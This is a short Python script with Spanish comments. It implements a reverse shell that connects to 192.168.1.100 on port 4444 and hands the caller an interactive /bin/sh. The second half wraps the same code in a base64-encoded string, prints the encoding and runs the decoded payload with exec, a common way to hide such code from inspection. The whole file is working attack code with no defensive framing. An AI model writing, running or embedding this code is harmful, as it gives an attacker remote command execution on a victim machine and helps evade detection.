import socket
import subprocess
import os


def reverse_shell():
    ATTACKER_IP = '192.168.1.100'
    ATTACKER_PORT = 4444

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr
        subprocess.call(['/bin/sh', '-i'])
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    reverse_shell()

import base64

# Código de la reverse shell como una cadena
payload = """
import socket
import subprocess
import os

def reverse_shell():
    ATTACKER_IP = '192.168.1.100'
    ATTACKER_PORT = 4444

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr
        subprocess.call(['/bin/sh', '-i'])
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    reverse_shell()
"""

# Convertir el payload a bytes, codificarlo en base64 y luego a cadena
encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

print(encoded_payload)

# Decodificar el payload
decoded_payload = base64.b64decode(encoded_payload).decode('utf-8')

# Ejecutar el payload decodificado
exec(decoded_payload)